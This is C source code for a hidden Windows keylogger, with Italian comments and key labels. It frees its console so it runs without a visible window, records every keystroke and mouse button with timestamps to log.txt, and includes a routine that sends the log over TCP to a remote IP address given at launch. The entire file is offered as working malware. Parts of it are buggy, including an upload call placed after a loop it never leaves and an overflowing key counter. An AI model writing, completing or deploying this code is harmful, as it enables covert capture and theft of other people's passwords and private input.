#include <stdio.h>
#include <ctype.h>
#include <windows.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#ifdef _WIN32
#include <winsock2.h>
#pragma comment(lib, "ws2_32.lib")
#else
#include <unistd.h>
#include <arpa/inet.h>
#endif

#define PORT 8000
#define BUFFER_SIZE 1024

const int virtual_keys[] = {
    VK_LBUTTON, VK_MBUTTON, VK_RBUTTON, VK_SHIFT, VK_BACK, VK_DELETE,
    VK_RETURN, VK_TAB, VK_CAPITAL, VK_CONTROL, VK_MENU,
    VK_HOME, VK_LEFT, VK_RIGHT, VK_UP, VK_DOWN, VK_ESCAPE, VK_SPACE,
    VK_NUMPAD0, VK_NUMPAD1, VK_NUMPAD2, VK_NUMPAD3, VK_NUMPAD4,
    VK_NUMPAD5, VK_NUMPAD6, VK_NUMPAD7, VK_NUMPAD8, VK_NUMPAD9,
    VK_MULTIPLY, VK_ADD, VK_SEPARATOR, VK_SUBTRACT, VK_DECIMAL,
    VK_DIVIDE
};

const char* descriptions[] = {
    "[TASTO_SINISTRO]\n", "[TASTO_CENTRALE]\n", "[TASTO_DESTRO]\n", "[SHIFT]", "[CANCELLA]", "[CANC]",
    "[INVIO]\n", "[TAB]\t", "[CAPS_LOCK]", "[CTRL]", "[ALT]",
    "[HOME]\n", "[SINISTRA]\n", "[DESTRA]\n", "[SU]\n", "[GIU]\n", "[ESC]\n", " ",
    "0", "1", "2", "3", "4",
    "5", "6", "7", "8", "9",
    "*", "+", "-", ".", "/"
};

void error(const char *msg) {
    perror(msg);
    exit(EXIT_FAILURE);
}

void send_file(const char *filename, const char *ip_address) {
    FILE *file = fopen(filename, "rb");
    if (file == NULL) {
        error("Error opening file");
    }

    #ifdef _WIN32
    WSADATA wsa_data;
    if (WSAStartup(MAKEWORD(2, 2), &wsa_data) != 0) {
        error("Error initializing Winsock");
    }
    #endif

    SOCKET sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd == INVALID_SOCKET) {
        error("Error creating socket");
    }

    struct sockaddr_in server_addr;
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = inet_addr(ip_address);
    server_addr.sin_port = htons(PORT);

    if (connect(sockfd, (struct sockaddr *)&server_addr, sizeof(server_addr)) == SOCKET_ERROR) {
        error("Error connecting to server");
    }

    char buffer[BUFFER_SIZE];
    size_t bytes_read;
    while ((bytes_read = fread(buffer, 1, BUFFER_SIZE, file)) > 0) {
        if (send(sockfd, buffer, bytes_read, 0) == SOCKET_ERROR) {
            error("Error sending file");
        }
    }

    fclose(file);
    closesocket(sockfd);

    #ifdef _WIN32
    WSACleanup();
    #endif
}

int isMaiusc(){
	if(GetKeyState(VK_CAPITAL) == 1){
		if (GetKeyState(VK_SHIFT) < 0) // se è premuto
			return 0;
		return 1;
	}
	else
		if (GetKeyState(VK_SHIFT) < 0)
			return 1;
	return 0;
}

char *get_time(){
	time_t rawtime;
	struct tm *timeinfo;
	time(&rawtime);
	timeinfo = localtime(&rawtime);
	return asctime(timeinfo);
}

int Save(int _key, char* file){
	FILE *OUTPUT_FILE;
	OUTPUT_FILE = fopen(file, "a+");
	Sleep(10);
	short size = sizeof(virtual_keys)/sizeof(virtual_keys[0]);
	for(int i=0; i<size; i++){
		if(_key == virtual_keys[i]){
			fprintf(OUTPUT_FILE, "%s", descriptions[i]);
			fclose(OUTPUT_FILE);
			return 0;
		}
	}
	if(_key == VK_END){
		fprintf(OUTPUT_FILE, "\n\n--------------------------------------------------\n");
		fprintf(OUTPUT_FILE, "FINE: %s", get_time());
		fprintf(OUTPUT_FILE, "--------------------------------------------------\n");
		fclose(OUTPUT_FILE);
		return 1; // l'ho messo per far terminare il programma
	}
	if(_key != 0){
		if(isMaiusc()){
			_key = toupper(_key);
			fprintf(OUTPUT_FILE, "%s", &_key);
			fclose(OUTPUT_FILE);
			return 0;
		}
		_key = tolower(_key);
		fprintf(OUTPUT_FILE, "%s", &_key);
		fclose(OUTPUT_FILE);
	}
	return 0;
}

int main(int argc, char *argv[]){
    if (argc != 2) {
        error("Usage: ./newkey <ip_address>");
    }
    const char *ip_address = argv[1];
    
	FreeConsole();
	FILE *OUTPUT_FILE;
	OUTPUT_FILE=fopen("log.txt", "a+");
	fprintf(OUTPUT_FILE, "--------------------------------------------------\n");
	fprintf(OUTPUT_FILE, "INIZIO: %s", get_time());
	fprintf(OUTPUT_FILE, "--------------------------------------------------\n\n");
	fclose(OUTPUT_FILE);
	char i;
	while(1){
		Sleep(10);
		for(i=8; i<=255; i++){
			if(GetAsyncKeyState(i) == -32767){
				if(Save(i, "log.txt"))
					return 0;
			}
		}
	}
    send_file("log.txt", ip_address);
	return 0;
}
// gcc -o newkey newkey.c -lws2_32